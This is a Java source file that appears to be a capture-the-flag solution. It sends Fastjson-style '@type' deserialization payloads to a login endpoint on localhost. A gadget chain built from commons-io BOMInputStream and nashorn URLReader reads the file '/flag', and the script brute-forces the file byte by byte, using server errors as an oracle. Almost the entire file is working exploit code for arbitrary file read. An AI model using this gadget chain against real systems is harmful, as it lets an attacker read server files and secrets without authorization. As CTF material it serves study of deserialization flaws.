import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.client.RestTemplate;

import java.net.URI;

public class Solve {
    public static void main(String[] args) throws Exception{

        // first Time
        getInputStream();

        // second Time
        String payload = "{\"username\":\"ricky\",\"password\":\"ricky\",\"rememberMe\":[{" +
                "\"aaa\":{" +
                "\"@type\":\"java.io.InputStream\"," +
                "\"@type\":\"org.apache.commons.io.input.BOMInputStream\"," +
                "\"delegate\":{" +
                "\"@type\":\"org.apache.commons.io.input.ReaderInputStream\"," +
                "\"reader\":{" +
                "\"@type\":\"jdk.nashorn.api.scripting.URLReader\"," +
                "\"url\":\"file:///flag\"}," +
                "\"charsetName\":\"UTF-8\"," +
                "\"bufferSize\":1024}," +
                "\"boms\":[{" +
                "\"charsetName\":\"UTF-8\"," +
                "\"bytes\":[${byte}]}]}," +
                "\"bbb\":{" +
                "\"@type\":\"java.io.Reader\"," +
                "\"@type\":\"org.apache.commons.io.input.CharSequenceReader\"," +
                "\"charSequence\":{" +
                "\"@type\":\"java.lang.String\"{\"$ref\":\"$.rememberMe[0].aaa.BOM[0]\"}," +
                "\"start\":0,\"end\":0}}]}";
        System.out.println(payload);

        String pattern = "";
        String flag = "";

        for (int j = 0; j < 50; j++) {
            for (int i = 33; i <= 126; i++) {
                String temp = payload;
                if(pattern.equals("")) {
                    temp = temp.replace("${byte}", String.valueOf(i));
                } else {
                    temp = temp.replace("${byte}", pattern + "," + i);
                }
                System.out.println(temp);
                if (doPOST(temp)) {
                    if(pattern.equals("")) {
                        pattern += String.valueOf(i);
                    } else {
                        pattern += "," + i;
                    }
                    flag += (char) i;
                    System.out.println(flag);
                    break;
                }
            }
        }

    }

    public static void getInputStream() throws Exception {
        String payload = "{\"username\":\"ricky\",\"password\":\"ricky\",\"rememberMe\":[{" +
                "\"@type\":\"java.lang.Exception\"," +
                "\"@type\":\"org.junit.jupiter.params.shadow.com.univocity.parsers.common.input.BomInput$BytesProcessedNotification\"," +
                "\"input\":{}" +
                "}]}";
        doPOST(payload);
    }

    public static boolean doPOST(String payload) {
        try {
            HttpHeaders headers = new HttpHeaders();
            MediaType type = MediaType.parseMediaType("application/json; charset=UTF-8");
            headers.setContentType(type);
            headers.add("Accept", MediaType.APPLICATION_JSON.toString());
            URI url = new URI("http://127.0.0.1:8090/login");
            HttpEntity<String> requestEntity = new HttpEntity<>(payload, headers);
            RestTemplate restTemplate = new RestTemplate();
            ResponseEntity<String> res = restTemplate.postForEntity(url, requestEntity, String.class);
            return false;
        } catch (Exception e) {
            return true;
        }
    }
}
